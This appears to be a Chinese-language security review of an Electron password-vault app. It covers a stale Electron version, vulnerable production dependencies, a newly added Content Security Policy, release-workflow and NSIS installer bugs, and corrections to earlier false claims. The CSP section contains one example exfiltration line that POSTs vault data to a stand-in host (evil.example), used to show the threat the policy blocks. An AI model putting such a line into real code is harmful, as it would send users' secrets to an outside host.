## 上一轮写错的地方（真机复核）

留着这一节是因为「审计结论本身可能是错的」这件事值得被记录，而不是悄悄改掉。

**1. 「Electron 已升级」是假的。** 上一轮把 `package.json` 改成了 `^41.10.3`，
但**从没跑过 `npm install`**——`node_modules` 里装的仍然是 30.5.1，
`package-lock.json` 里锁的也是 30.5.1。也就是说那次「升级」只改了一个声明文件，
用户实际跑的、构建实际打包的，全都还是那个停止支持的版本。

这个失败形态特别值得记：**声明和现实脱节，而且两边都不报错**。更糟的是它会让
CI 直接挂——`npm ci` 在 package.json 与 lock 不一致时会拒绝安装，而那个错误信息
（"can only install packages when your package.json and package-lock.json are in
sync"）跟"安全升级没生效"看起来毫无关系。

真机上跑完 `npm install` 之后才是真的：electron 41.10.3 + electron-builder 26.15.3。

**2. 「electron-builder 的 signtoolOptions 已经就位」也是假的。**
`electron-builder.json5` 里正确地按 v26 的新路径写了 `win.signtoolOptions`，但
实际装的是 v24——那个版本**不认识**这个键，会静默忽略。后果正是那份配置自己在
注释里警告过的那一种：**产出一个你以为签好了、客户端却拒绝的包**。同一个
`npm install` 一并解决了。

**3. 「CI 里一个依赖扫描都没有」在写的时候是对的，但那句话没提到更要紧的一点**
——扫描加上去之后**第一次跑就会红**：生产依赖树里当时有 3 个 high。见下一节。

## 高：Electron 版本已停止支持（已修）

```
之前:  electron 30.5.1        （停止支持约 18 个月，Chromium 不再收安全更新）
现在:  electron 41.10.3       + electron-builder 26.15.3
```

Electron 30 捆绑的 Chromium **再没有收到过安全更新**，而这个应用恰恰要在渲染
进程里处理不可信内容：Markdown 笔记、剪贴板里的富文本 HTML、拖进来的文件、
OCR 输入。这是整轮里唯一一条「攻击者可以直接利用」的——其余几项都是纵深防御。

跨 11 个大版本升级本来是有风险的（Node ABI、`webContents` 与 session API、
`utilityProcess`、`app.getPath` 行为都有破坏性变更），所以升完在真机上逐项验证过：

- `tsc --noEmit` 干净——**这一条最有信息量**：主进程、preload、更新逻辑全都是
  TypeScript，Electron 的 API 破坏性变更绝大多数会在这里显形。
- `vite build` 通过，产物里 CSP 注入正常。
- `npm run test:update`：32/32 通过（签名验证、形态选择、回滚逻辑）。
- 完整 `build:standalone` 打包通过，两种形态都产出。

**以后跟着 Electron 的 8 周节奏走，别再落下。** 落下 11 个版本之后再补，代价
就是上面这一串验证；每次跟一个版本几乎不需要验证。

## 高：生产依赖树里的 6 个已知漏洞（已修）

`npm audit --omit=dev` 在修之前的输出：**6 vulnerabilities (3 moderate, 3 high)**。

三个 high 分别是 `postcss`（路径穿越，读任意 `.map` 文件）、`fast-uri`（反斜杠
导致的 host 混淆）、`brace-expansion`（可导致 OOM 的 DoS）。

**六个全部来自同一个根**：`shadcn` 被写进了 `dependencies`。

`shadcn` 是一个**脚手架 CLI**——它把组件源码**复制进你的仓库**
（`src/components/ui/` 里那些文件就是它生成的），运行时不需要它。

但它一旦进了 `dependencies`，就把一整套服务端组件拖进了一个**密码金库**的生产
依赖树：`@modelcontextprotocol/sdk`、`@hono/node-server`（一个 HTTP 服务器）、
`ts-morph`、`postcss`……

改成 `devDependencies` 之后：

```
npm audit --omit=dev  →  found 0 vulnerabilities
```

### 一个差点犯的错，值得写下来

第一次改的时候直接把它**整个删掉**了——因为 `grep` 过全部 `.ts`/`.tsx`，没有
任何地方 `import` 它。类型检查也照样通过。

然后**打包构建炸了**：

```
[@tailwindcss/vite] Can't resolve 'shadcn/tailwind.css' in .../ui/src
```

`src/index.css:3` 有一行 `@import "shadcn/tailwind.css"`。**它是被 CSS 引用的，
不是被 JS 引用的**，所以只搜 JS/TS 的 import 永远找不到它，而 `tsc` 也不会知道。

这件事本身就是本轮最有用的一条经验：**"没有代码 import 它"不等于"没有用到它"**。
判据只有一个——**完整构建一遍**。要不是跑了真实打包，这个改动会以"安全加固"的
名义合进去，然后在下一次发版时才炸。

所以它现在是 `devDependencies`：分类是准确的（构建期要用，运行期不要），
而 `--omit=dev` 的审计门禁只看用户真正下载的那棵树。

**这条的教训不是"shadcn 有漏洞"**——它是个正经工具。是**构建期工具不该出现在
运行期依赖里**：依赖树的每一个包都是供应链攻击面。

## 中：渲染进程没有 CSP（本轮已修）

### 原来的问题

`contextIsolation: true` + `nodeIntegration: false` 都开着，这挡住了「注入的脚本
拿到 Node 能力」。但它挡不住更直接的一件事：

```js
fetch('https://evil.example/', { method: 'POST', body: JSON.stringify(everything) })
```

金库解锁之后，笔记、密码、剪贴板历史都在渲染进程的内存里。上面这行**完全不需要
碰 Node**，contextIsolation 对它没有任何作用。

现有的净化措施是有的：`ClipboardScreen` 用 DOMPurify，`NotesScreen` 用
`markdown-it({ html: false })`。但净化器被绕过是这类库的历史常态——DOMPurify 自己
就发过多次绕过公告。**问题不是净化器不行，而是净化器一旦失手就满盘皆输**，中间
没有第二道闸。

### 现在

`scripts/csp-policy.mjs` 生成策略，vite 在构建时注入 `index.html`。打包版：

```
default-src 'none';
script-src 'self' file:;
style-src 'self' 'unsafe-inline' file:;
img-src 'self' data: blob: file:;
font-src 'self' data: file:;
media-src 'self' blob: file:;
worker-src 'self' blob:;
connect-src 'self' data: blob: file:;
object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'
```

**最要紧的是 `connect-src` 里没有 `http:` 和 `https:`。** 渲染进程本来也不需要
它们：后端调用全走 preload 的 IPC，OCR 的 wasm 和语言包都在本地
（`src/lib/ocr.ts` 指向 `public/tesseract/`）。于是净化器被绕过的后果从「金库内容
被打包送走」降级成「跑了段脚本但送不出去」。

`file:` 必须留：打包后页面是 `file://` 加载的，tesseract.js 用 fetch 取本地资源。
Chromium 对 `file://` 的跨文件读取另有独立限制（默认禁止），放行 `file:` 不等于
放开本地文件读取。

`style-src` 放行了 `'unsafe-inline'`：Tailwind 和多个组件库会往页面里插 `<style>`，
React 的 style 属性也算。inline 样式能造成的危害小得多（顶多界面伪装），而禁掉它
要给每一处加 nonce，投入产出不成比例。

dev 另有一套宽松策略（HMR 需要 `'unsafe-eval'` 和 `ws:`）。两套写死任何一套都会
出事：dev 用严格的话 HMR 直接不工作且报错跟 CSP 毫无关联，打包用宽松的等于没加。

`tests/csp.test.mjs` 里 7 条用例守的不是「CSP 存在」，而是**打包版里绝不能出现的
东西**——这类策略最容易的事故是为了让某个功能跑通顺手加一条 `https:`，加完整条
策略名存实亡，而且不会有任何报错。

**待实测**：打包后 OCR 仍然能用（CSP 收得太紧和收得不够一样是 bug）。

## 中：发布工作流只上传一个 exe（已修）

`.github/workflows/build-windows.yml` 的产物定位步骤原来是：

```powershell
Get-ChildItem ... -Filter '*.exe' | Sort-Object Length -Descending | Select-Object -First 1
```

这在只有 portable 一个目标的时候是对的。加上 nsis 安装包之后，构建产出**两个**
exe，而这一步只挑最大的那个传上去。

后果是一次**静默的发布事故**：release 里只有一种形态，而客户端是按自己的形态找
资产的（`electron/updateVersion.ts` 的 `selectUpdateAsset` 靠文件名里有没有
`Setup` 区分，且**刻意不做跨形态回退**——安装版找不到 Setup 包时不会退回去下
免安装版，那会把一个装好的应用替换成一个免安装 exe）。少了哪一个，那一半用户
点更新就会看到「找不到对应形态的构建」，而构建、上传、发布全程不报任何错。

改成显式核对：**必须恰好两个，且恰好一个带 `Setup`**，数量不对就让构建失败。
比"挑一个继续"好的地方在于，下次再加一个目标（比如 arm64）时它会立刻炸，而不是
又悄悄少传一个。

## 只有真机构建才会暴露的两个问题（都已修）

这两条都不是安全漏洞，但它们和上面那条工作流 bug 属于同一类——**构建照常成功、
没有任何报错，坏掉的东西要等用户拿到手才发现**。放在这份文档里是因为它们共同说明
一件事：**没跑过完整构建的改动，等于没验证过。**

### 1. 安装包**从来没有构建成功过**

`nsis/installer.nsh`（那个让用户选数据保存位置的自定义页）里用了
`!insertmacro MUI_HEADER_TEXT`。electron-builder 把这个文件 `!include` 进生成脚本的
位置，在 `MUI2.nsh` **之前**，而 `!insertmacro` 是**编译期**指令——解析到那一行时
宏还不存在：

```
!insertmacro: macro named "MUI_HEADER_TEXT" not found!
Error in script "<stdin>" on line 76 -- aborting creation process
```

**免安装版（portable）不受影响，照常构建成功。** 也就是说"构建通过"这件事完全
不能说明安装包是好的——两个目标必须分别验证。这一页是"安装时能选数据位置"这个
需求的**唯一实现**，而它一次都没有真正生成过。

改成运行时给 MUI 的 header 控件（ID 1037/1038）直接发 `WM_SETTEXT`，不再依赖
MUI 的宏，也就不依赖它被 include 的先后顺序。

修完这个之后又连着暴露了两条，都是同一份脚本从没被编译过才攒下来的：

**(a) 卸载程序那一遍编译不过。** electron-builder 用同一份脚本跑两遍 makensis，
第二遍带 `-DBUILD_UNINSTALLER`，而插入自定义页的那句 `!insertmacro
customPageAfterChangeDir` 在模板里位于 `!ifndef BUILD_UNINSTALLER` 之内。于是那几个
页面函数在卸载程序那一遍定义了却没人引用：

```
warning 6010: install function "Ideal1DataDirPageCreate" not referenced
warning 6001: Variable "Ideal1DataDirPage" not referenced or never set
```

electron-builder 给 makensis 传了 `-WX`（警告即错误），两条都会让构建失败。把页面
函数和三个 nsDialogs 控件句柄一起放进 `!ifndef BUILD_UNINSTALLER` 就好了；
`$Ideal1DataDir` 必须留在外面——它由 `preInit` 赋值，而 `preInit` 所在的
`Function .onInit` **两遍都会编译**。

**(b) 一行注释把下一行代码吃掉了。** 这条最值得记：

```nsis
; JSON 里 \ 必须转义成 \\        ← 行尾是反斜杠
${WordReplace} "$Ideal1DataDir" "\" "\\" "+" $R0   ← 被当成上一行的续行，整行忽略
```

NSIS 把行尾反斜杠当续行符，**注释也不例外**。后果是 `$R0` 永远不会被赋值，安装程序
写出去的是 `{"dataDir": ""}`；`data_dir.py` 的 `read_configured_data_dir()` 判定空值
无效，**静默回落到默认目录**。

也就是说：用户在安装时认真选的数据位置会被无声无息地丢掉，而这一页存在的唯一理由
就是让他能选。没有任何报错，界面上一切正常，只有几个月后他去那个目录找金库时才会
发现不对。

`makensis` 的 `warning 6050` 正好指出了这一行——这次是"警告即错误"救了场。

### 2. 打包出来的 exe 顶着 Electron 的身份

`electron-builder.json5` 里原来是 `"signAndEditExecutable": false`，旁边注释还写着
"confirmed on 24.13.3：这个标志只跳过签名，不影响图标写入"。那句话在 24 上是对的，
**在 26 上不再成立**——26 起它会把「签名」和「资源编辑」一起关掉。

真机实测产物（Electron 41.10.3 + electron-builder 26.15.3）：

```
ProductName : Electron        ← 应该是 Ideal1 File Vault
FileVersion : 41.10.3         ← 那是 Electron 的版本，不是 0.1.0
CompanyName : GitHub, Inc.
图标        : Electron 默认图标
```

对一个装密码的工具来说这不只是难看：用户看到的是别人的名字和一个对不上的版本号，
而"我现在装的是哪一版"恰恰是更新出问题时唯一能自查的线索。

改用 `signExecutable: false`（electron-builder 26 自己在日志里给的答案），
`signAndEditExecutable` 留默认值 true。

## 低：`shell=True`（已修）

`modules/file_vault/__init__.py` 起 `npm run dev` 时用了 `shell=True`。

参数是写死的，用户输入到不了这里，所以从来不是可利用的漏洞。改掉是因为它是个
**坏样板**：下一个人照着这行写一句带变量的命令就成了命令注入，而两处代码看起来
一模一样。

现在走 `shutil.which('npm')` 解析出真实路径 + `shell=False`。（Windows 上 npm 是
`npm.cmd` 批处理文件，CreateProcess 不能直接执行——这正是当初加 `shell=True` 的
原因；`which()` 返回带扩展名的完整路径就绕开了这件事。）

## 确认做得对的地方

这些不是可有可无的评语——下次改动时把它们弄坏了，上面那些防护就都白搭。

**后端走 stdio，不开 TCP 端口。** `backend_server.serve()` 用标准输入输出跟主进程
说话。这意味着本机上没有任何别的进程能连上金库后端。绝大多数 Electron + 本地服务
的应用会开一个 localhost 端口，那就得再自己做一套认证——这里根本不存在这个攻击面。

**没有硬编码的密钥或盐。** IMK 是每台机器 `os.urandom(32)` 现生成的，五个解锁槽位
各有自己的 `os.urandom(16)` 随机盐。同一个安装包发一千个人，得到一千个互不相干的
金库。

**`web_fetch.py` 的 SSRF 防护是认真做的。** 先解析主机名，任何解析结果落在
loopback / 私有 / 链路本地 / 保留 / 组播地址就拒绝；**不自动跟随重定向**——每一跳
都要重新检查，而静默走完重定向链正是这类检查被绕过的典型方式。有内容类型白名单和
下载上限。

**`desktop_control.py` 给 AI 的是白名单，不是 shell。** 输入走 stdin 而非命令行。

**导航被锁死。** `setWindowOpenHandler` 一律 deny；`will-navigate` 只放行受信 URL，
拖进来的文件按扩展名走导入通道而不是让它替换页面。

**没有 `eval` / `exec` / `pickle`。** 全仓 Python 代码里一处都没有。

**渲染的两处不可信内容都有净化。** 剪贴板富文本走 DOMPurify 且额外禁了一批标签；
Markdown 用 `html: false`，原始 HTML 会被转义。

## 已经补上的

- **依赖漏洞扫描进 CI**：`.github/workflows/security.yml`——`npm audit --omit=dev`
  + `pip-audit`，push / PR / **每周一定时**各跑一次。定时那一条是关键：依赖不动，
  CVE 会动，今天干净的树下周可能就带着一个 critical，而那天未必有人提交代码。
- **第三方组件清单的一致性检查**（`npm run notices:check`）也在同一个 workflow
  里。`LICENSING.md` 承诺了"应用内能看到归属声明"，清单过期等于这个承诺失效，
  而它不会以任何方式自己报错。本轮实测有效：移除 shadcn 之后它立刻红了。

## 仍然没做的

按建议顺序：

1. **落盘文件的 ACL**：Windows 上默认继承目录权限，`%LOCALAPPDATA%` 对同机其他
   账户通常不可读，但值得显式确认并收紧（**待实测**）。
2. **`activity_log` 里是否会带上明文路径/文件名**——记录的内容还没细看。一个
   记录"用户加密了 D:\离职材料\xxx.docx"的日志，本身就是需要保护的元数据。
3. **Python 测试套件太慢，CI 会超时**。scrypt 提到 N=2¹⁷ 之后，每次
   `setup_complete` 要做 5 次 128 MiB 的 KDF，而大量测试都会走一遍完整 setup。
   真机上跑到 14% 用了约 20 分钟，`security.yml` 里 `timeout-minutes: 25` 几乎
   必然不够。

   **不要为此调低生产的 scrypt 参数**——那是拿真实安全性换 CI 时长。可行的方向
   是让测试共用少数几个已 setup 好的金库夹具，而不是每个用例重建一个。

4. **`signer-policy.json` 目前是空的**，意味着更新功能会拒绝一切更新（应用本身
   照常可用）。这是**安全的默认值**，不是 bug——但正式发版前必须在签名机上跑一次
   `npm run build:standalone`（脚本会自动造证书并把公钥指纹钉进去），然后**提交
   那个文件**。

   本轮刻意没有代跑这一步：它等于**选定这个项目的发布信任根**，一旦发布出去，
   换证书就意味着所有已安装的客户端都得手工重装。这个决定应该由你自己做。
